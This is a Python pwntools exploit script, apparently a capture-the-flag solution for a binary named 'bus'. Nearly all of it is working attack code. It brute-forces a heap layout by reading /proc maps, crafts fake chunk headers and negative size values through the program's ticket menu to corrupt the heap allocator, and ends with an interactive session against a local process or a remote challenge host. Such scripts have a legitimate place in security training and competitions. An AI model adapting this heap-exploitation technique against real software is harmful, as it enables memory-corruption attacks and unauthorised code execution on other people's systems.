#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./bus"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
os.environ={"LD_LIBRARY_PATH":"./"}
r = None
pid = 0
def get_cc():
    global r
    if len(sys.argv) == 2:
        r=remote("pwn.ot",3333)
    else:
        r=process("./bus")

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.address)
    pause()

def buy(dst,size=1):
    r.sendlineafter("do:","1")
    r.sendlineafter("go:",dst)
    r.sendlineafter("How many people: ",str(size&0xffffffffffffffff))

def select(dst):
    r.sendlineafter("do:","2")
    r.sendlineafter("Where is your destination:",dst)

def go():
    r.sendlineafter("do:","3")

def dele(dst):
    select(dst)
    go()

context.log_level = "error"

while True:
    get_cc()
    buy(" ")
    with open("/proc/%d/maps"%r.pid,"r") as f:
        data=f.read()
    line = data.split("\n")[3]
    heap_base = int(line[:line.find("-")],16)
    if heap_base&0xffff == 0xf000:
        break
    r.close()

for i in range(0x21,0x40):
    if i == 0x38 or i ==0x39:
        buy(p64(i)+p64(0x91)*14)
    else:
        buy(p64(i))

for i in range(0x21,0x28):
    dele(p64(i))

context.log_level = "debug"
# get unsort bin
dele("9")
for i in range(8):
    buy(p32(i+0x61))

buy("AAAA")
buy(" ",-0x420)
dele("h")
dele("")
buy("BBBB")
dele(":")
buy(":")
buy(" ",-0x30)
dele("BBBB")
dele("\x91")
#buy(" ",-0x4b0)
buy("CCCCCCC\x00"+p64(0x91)*5+"\x78")
buy("DDDDDDDD")
buy("EEEEEEEE")
buy("")
buy(" ",29+16+0xba3+8)
dele("b")

r.interactive()






